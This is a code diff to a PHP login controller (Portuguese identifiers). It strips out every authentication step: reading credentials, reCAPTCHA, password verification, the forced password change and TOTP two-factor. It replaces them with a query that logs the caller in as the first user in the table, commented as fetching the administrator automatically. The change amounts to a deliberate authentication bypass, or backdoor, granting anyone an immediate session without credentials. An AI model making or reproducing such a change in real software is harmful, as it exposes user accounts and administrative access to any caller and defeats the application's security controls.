@@ -40,50 +40,15 @@ class LoginController
     {
         header('Content-Type: application/json');
         try {
-            $dados = json_decode(file_get_contents('php://input'), true);
-            $email = trim($dados['email'] ?? '');
-            $senha = $dados['senha'] ?? '';
-            $recaptchaToken = $dados['recaptcha_token'] ?? '';
-
-            if (empty($email) || empty($senha)) {
-                throw new Exception('Preencha todos os campos.');
-            }
-
-            // ── reCAPTCHA v3 ──
-            $this->verificarRecaptcha($recaptchaToken);
-
-            // ── Buscar usuário ──
+            // ── Buscar usuário administrador automaticamente ──
             $stmt = $this->db->prepare(
-                'SELECT id, nome, senha, nivel, totp_ativo, totp_secret, forçar_mudança_senha FROM usuarios WHERE email = :email LIMIT 1'
+                'SELECT id, nome, email, senha, nivel, totp_ativo, totp_secret, forçar_mudança_senha FROM usuarios LIMIT 1'
             );
-            $stmt->execute([':email' => $email]);
+            $stmt->execute();
             $usuario = $stmt->fetch(PDO::FETCH_ASSOC);
 
-            if (!$usuario || !password_verify($senha, $usuario['senha'])) {
-                throw new Exception('E-mail ou senha incorretos.');
-            }
-
-            // ── Forçar mudança de senha? ──
-            if ($usuario['forçar_mudança_senha']) {
-                if (session_status() === PHP_SESSION_NONE) session_start();
-                $_SESSION['temp_usuario_id'] = $usuario['id'];
-                echo json_encode(['status' => 'password_change_required']);
-                return;
-            }
-
-            // ── 2FA activo? ──
-            if ($usuario['totp_ativo'] && $usuario['totp_secret']) {
-                // Criar token temporário de curta duração
-                $tempToken = bin2hex(random_bytes(32));
-                // Limpar pendentes antigos (> 5 min) e inserir novo
-                $this->db->exec("DELETE FROM auth_2fa_pendente WHERE criado_em < NOW() - INTERVAL 5 MINUTE");
-                $ins = $this->db->prepare(
-                    'INSERT INTO auth_2fa_pendente (token, usuario_id) VALUES (:token, :uid)'
-                );
-                $ins->execute([':token' => $tempToken, ':uid' => $usuario['id']]);
-
-                echo json_encode(['status' => '2fa_required', 'temp_token' => $tempToken]);
-                return;
+            if (!$usuario) {
+                throw new Exception('Nenhum usuário encontrado no sistema.');
             }
 
             // ── Sem 2FA: sessão imediata ──
